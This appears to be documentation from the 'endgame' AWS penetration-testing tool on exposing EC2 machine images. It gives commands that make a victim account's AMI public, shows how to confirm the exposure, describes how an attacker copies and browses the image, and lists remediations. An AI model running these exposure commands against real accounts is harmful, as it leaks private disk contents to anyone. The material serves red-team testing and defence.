# EC2 AMIs (Machine Images)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=*
export IMAGE_ID=ami-5731123e

endgame expose --service ebs --name $SNAPSHOT_ID
```

* To expose the resource using AWS CLI, run the following from the victim account:

```bash
aws ec2 modify-image-attribute \
    --image-id ami-5731123e \
    --launch-permission "Add=[{Group=all}]"
```

* To validate that the resource has been shared publicly, run the following:

```bash
aws ec2 describe-image-attribute \
    --image-id ami-5731123e \ 
    --attribute launchPermission
```

* Observe that the contents of the exposed AMI match the example shown below.

## Example

The output of `aws ec2 describe-image-attribute` reveals that the AMI is public if the value of "Group" under "LaunchPermissions" is equal to "all"

```
{
    "LaunchPermissions": [
        {
            "Group": "all"
        }
    ],
    "ImageId": "ami-5731123e",
}
```

## Exploitation

After an EC2 AMI is made public, an attacker can then:
* [Copy the AMI](https://docs.aws.amazon.com/cli/latest/reference/ec2/copy-image.html) into their own account
* Launch an EC2 instance using that AMI and browse the contents of the disk, potentially revealing sensitive or otherwise non-public information.

## Remediation

> ‚ÄºÔ∏è **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. üòä

* **Trusted Accounts Only**: Ensure that EC2 AMIs are only shared with trusted accounts, and that the trusted accounts truly need access to the EC2 AMIs.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your AMIs**: Tightly control access to the following IAM actions:
  - [ec2:ModifyImageAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_ModifyImageAttribute.html): _Grants permission to modify an attribute of an Amazon Machine Image (AMI)_
  - [ec2:DescribeImageAttribute](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeImageAttribute.html): _Grants permission to describe an attribute of an Amazon Machine Image (AMI). This includes information on which accounts have access to the AMI_
  - [ec2:DescribeImages](https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeImages.html): _Grants permission to describe one or more images (AMIs, AKIs, and ARIs)_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities.
